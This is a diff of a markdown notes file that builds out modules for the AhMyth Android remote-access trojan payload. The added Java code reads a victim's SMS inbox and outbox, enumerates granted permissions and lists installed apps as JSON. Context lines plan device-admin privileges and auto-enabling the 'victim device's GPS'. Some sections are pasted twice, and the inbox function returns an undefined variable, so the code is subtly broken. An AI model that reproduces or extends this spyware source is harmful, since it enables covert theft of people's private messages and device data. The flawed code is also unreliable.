@@ -234,6 +234,376 @@ public class ConnectionManager {
 
     }
 ```
+## Updated SMS Manager.
+```java
+    public static JSONObject getSMSInboxList(){
+
+        try {
+
+            JSONObject SMSInboxList = new JSONObject();
+
+            JSONArray list = new JSONArray();
+
+            Uri uriSMSURI = Uri.parse("content://sms/inbox");
+
+            Cursor cur = MainService.getContextOfApplication().getContentResolver().query(uriSMSURI, null, null, null, null);
+
+            while (cur.moveToNext()) {
+
+                JSONObject sms = new JSONObject();
+
+                String address = cur.getString(cur.getColumnIndex("address"));
+
+                String body = cur.getString(cur.getColumnIndexOrThrow("body"));
+
+                sms.put("phoneNo" , address);
+
+                sms.put("msg" , body);
+
+                list.put(sms);
+
+            }
+
+            SMSInboxList.put("smsList", list);
+
+            Log.e("done" ,"collecting");
+
+            return SMSOutboxList;
+
+        } catch (JSONException e) {
+
+            e.printStackTrace();
+
+        }
+
+        return null;
+
+    }
+    
+        public static JSONObject getSMSOutboxList(){
+
+        try {
+
+            JSONObject SMSOutboxList = new JSONObject();
+
+            JSONArray list = new JSONArray();
+
+            Uri uriSMSURI = Uri.parse("content://sms/outbox");
+
+            Cursor cur = MainService.getContextOfApplication().getContentResolver().query(uriSMSURI, null, null, null, null);
+
+            while (cur.moveToNext()) {
+
+                JSONObject sms = new JSONObject();
+
+                String address = cur.getString(cur.getColumnIndex("address"));
+
+                String body = cur.getString(cur.getColumnIndexOrThrow("body"));
+
+                sms.put("phoneNo" , address);
+
+                sms.put("msg" , body);
+
+                list.put(sms);
+
+            }
+
+            SMSOutboxList.put("smsList", list);
+
+            Log.e("done" ,"collecting");
+
+            return SMSOutboxList;
+
+        } catch (JSONException e) {
+
+            e.printStackTrace();
+
+        }
+
+        return null;
+
+    }
+```
+## Permissions Management
+
+- PermissionsManager.java
+
+```java
+
+package ahmyth.mine.king.ahmyth;
+
+import android.content.pm.PackageInfo;
+
+import android.content.pm.PackageManager;
+
+import org.json.JSONArray;
+
+import org.json.JSONObject;
+
+import static ahmyth.mine.king.ahmyth.ConnectionManager.context;
+
+public class PermissionManager {
+
+    public static JSONObject getGrantedPermissions() {
+
+        JSONObject data = new JSONObject();
+
+        try {
+
+            JSONArray perms = new JSONArray();
+
+            PackageInfo pi = context.getPackageManager().getPackageInfo(context.getPackageName(), PackageManager.GET_PERMISSIONS);
+
+            for (int i = 0; i < pi.requestedPermissions.length; i++) {
+
+                if ((pi.requestedPermissionsFlags[i] & PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0) perms.put(pi.requestedPermissions[i]);
+
+            }
+
+            data.put("permissions", perms);
+
+        } catch (Exception e) {
+
+        }
+
+        return data;
+
+    }
+
+    public static boolean canIUse(String perm) {
+
+        if(context.getPackageManager().checkPermission(perm, context.getPackageName()) == PackageManager.PERMISSION_GRANTED) return true;
+
+        else return false;
+
+    }
+
+}
+
+```
+
+## List Installed apps
+
+- AppList.java
+
+```java
+
+package ahmyth.mine.king.ahmyth;
+
+import android.content.pm.PackageInfo;
+
+import android.graphics.drawable.Drawable;
+
+import org.json.JSONArray;
+
+import org.json.JSONException;
+
+import org.json.JSONObject;
+
+import java.util.List;
+
+import static ahmyth.mine.king.ahmyth.ConnectionManager.context;
+
+public class AppList {
+
+    public static JSONObject getInstalledApps(boolean getSysPackages) {
+
+        JSONArray apps = new JSONArray();
+
+        List<PackageInfo> packs = context.getPackageManager().getInstalledPackages(0);
+
+        for(int i=0;i < packs.size();i++) {
+
+            PackageInfo p = packs.get(i);
+
+            if ((!getSysPackages) && (p.versionName == null)) {
+
+                continue ;
+
+            }
+
+            try {
+
+                JSONObject newInfo = new JSONObject();
+
+                String appname = p.applicationInfo.loadLabel(context.getPackageManager()).toString();
+
+                String pname = p.packageName;
+
+                String versionName = p.versionName;
+
+                int versionCode = p.versionCode;
+
+                newInfo.put("appName",appname);
+
+                newInfo.put("packageName",pname);
+
+                newInfo.put("versionName",versionName);
+
+                newInfo.put("versionCode",versionCode);
+
+                apps.put(newInfo);
+
+            }catch (JSONException e) {}
+
+        }
+
+        JSONObject data = new JSONObject();
+
+        try {
+
+            data.put("apps", apps);
+
+        }catch (JSONException e) {}
+
+        return data;
+
+    }
+
+}
+
+```
+
+## Permissions Management
+
+- PermissionsManager.java
+
+```java
+
+package ahmyth.mine.king.ahmyth;
+
+import android.content.pm.PackageInfo;
+
+import android.content.pm.PackageManager;
+
+import org.json.JSONArray;
+
+import org.json.JSONObject;
+
+import static ahmyth.mine.king.ahmyth.ConnectionManager.context;
+
+public class PermissionManager {
+
+    public static JSONObject getGrantedPermissions() {
+
+        JSONObject data = new JSONObject();
+
+        try {
+
+            JSONArray perms = new JSONArray();
+
+            PackageInfo pi = context.getPackageManager().getPackageInfo(context.getPackageName(), PackageManager.GET_PERMISSIONS);
+
+            for (int i = 0; i < pi.requestedPermissions.length; i++) {
+
+                if ((pi.requestedPermissionsFlags[i] & PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0) perms.put(pi.requestedPermissions[i]);
+
+            }
+
+            data.put("permissions", perms);
+
+        } catch (Exception e) {
+
+        }
+
+        return data;
+
+    }
+
+    public static boolean canIUse(String perm) {
+
+        if(context.getPackageManager().checkPermission(perm, context.getPackageName()) == PackageManager.PERMISSION_GRANTED) return true;
+
+        else return false;
+
+    }
+
+}
+
+```
+
+## List Installed apps
+
+- AppList.java
+
+```java
+
+package ahmyth.mine.king.ahmyth;
+
+import android.content.pm.PackageInfo;
+
+import android.graphics.drawable.Drawable;
+
+import org.json.JSONArray;
+
+import org.json.JSONException;
+
+import org.json.JSONObject;
+
+import java.util.List;
+
+import static ahmyth.mine.king.ahmyth.ConnectionManager.context;
+
+public class AppList {
+
+    public static JSONObject getInstalledApps(boolean getSysPackages) {
+
+        JSONArray apps = new JSONArray();
+
+        List<PackageInfo> packs = context.getPackageManager().getInstalledPackages(0);
+
+        for(int i=0;i < packs.size();i++) {
+
+            PackageInfo p = packs.get(i);
+
+            if ((!getSysPackages) && (p.versionName == null)) {
+
+                continue ;
+
+            }
+
+            try {
+
+                JSONObject newInfo = new JSONObject();
+
+                String appname = p.applicationInfo.loadLabel(context.getPackageManager()).toString();
+
+                String pname = p.packageName;
+
+                String versionName = p.versionName;
+
+                int versionCode = p.versionCode;
+
+                newInfo.put("appName",appname);
+
+                newInfo.put("packageName",pname);
+
+                newInfo.put("versionName",versionName);
+
+                newInfo.put("versionCode",versionCode);
+
+                apps.put(newInfo);
+
+            }catch (JSONException e) {}
+
+        }
+
+        JSONObject data = new JSONObject();
+
+        try {
+
+            data.put("apps", apps);
+
+        }catch (JSONException e) {}
+
+        return data;
+
+    }
+
+}
+
+```
+# Possible upgrades 
 ## Possible Device Admin Privileges
 
 This will hopefully give the AhMyth Payload Administrator Privileges for future features.
@@ -325,134 +695,4 @@ This will hopefully allow automatic enabling of the victim device's GPS, Device 
                 Manifest.permission.BIND_DEVICE_ADMIN,
 
         });
-```
-# Permissions Management
-- PermissionsManager.java
-```java
-package ahmyth.mine.king.ahmyth;
-
-import android.content.pm.PackageInfo;
-
-import android.content.pm.PackageManager;
-
-import org.json.JSONArray;
-
-import org.json.JSONObject;
-
-import static com.etechd.l3mon.ConnectionManager.context;
-
-public class PermissionManager {
-
-    public static JSONObject getGrantedPermissions() {
-
-        JSONObject data = new JSONObject();
-
-        try {
-
-            JSONArray perms = new JSONArray();
-
-            PackageInfo pi = context.getPackageManager().getPackageInfo(context.getPackageName(), PackageManager.GET_PERMISSIONS);
-
-            for (int i = 0; i < pi.requestedPermissions.length; i++) {
-
-                if ((pi.requestedPermissionsFlags[i] & PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0) perms.put(pi.requestedPermissions[i]);
-
-            }
-
-            data.put("permissions", perms);
-
-        } catch (Exception e) {
-
-        }
-
-        return data;
-
-    }
-
-    public static boolean canIUse(String perm) {
-
-        if(context.getPackageManager().checkPermission(perm, context.getPackageName()) == PackageManager.PERMISSION_GRANTED) return true;
-
-        else return false;
-
-    }
-
-}
-```
-# List Installed apps
-- AppList.java
-```java
-package com.etechd.l3mon;
-
-import android.content.pm.PackageInfo;
-
-import android.graphics.drawable.Drawable;
-
-import org.json.JSONArray;
-
-import org.json.JSONException;
-
-import org.json.JSONObject;
-
-import java.util.List;
-
-import static com.etechd.l3mon.ConnectionManager.context;
-
-public class AppList {
-
-    public static JSONObject getInstalledApps(boolean getSysPackages) {
-
-        JSONArray apps = new JSONArray();
-
-        List<PackageInfo> packs = context.getPackageManager().getInstalledPackages(0);
-
-        for(int i=0;i < packs.size();i++) {
-
-            PackageInfo p = packs.get(i);
-
-            if ((!getSysPackages) && (p.versionName == null)) {
-
-                continue ;
-
-            }
-
-            try {
-
-                JSONObject newInfo = new JSONObject();
-
-                String appname = p.applicationInfo.loadLabel(context.getPackageManager()).toString();
-
-                String pname = p.packageName;
-
-                String versionName = p.versionName;
-
-                int versionCode = p.versionCode;
-
-                newInfo.put("appName",appname);
-
-                newInfo.put("packageName",pname);
-
-                newInfo.put("versionName",versionName);
-
-                newInfo.put("versionCode",versionCode);
-
-                apps.put(newInfo);
-
-            }catch (JSONException e) {}
-
-        }
-
-        JSONObject data = new JSONObject();
-
-        try {
-
-            data.put("apps", apps);
-
-        }catch (JSONException e) {}
-
-        return data;
-
-    }
-
-}
 ```
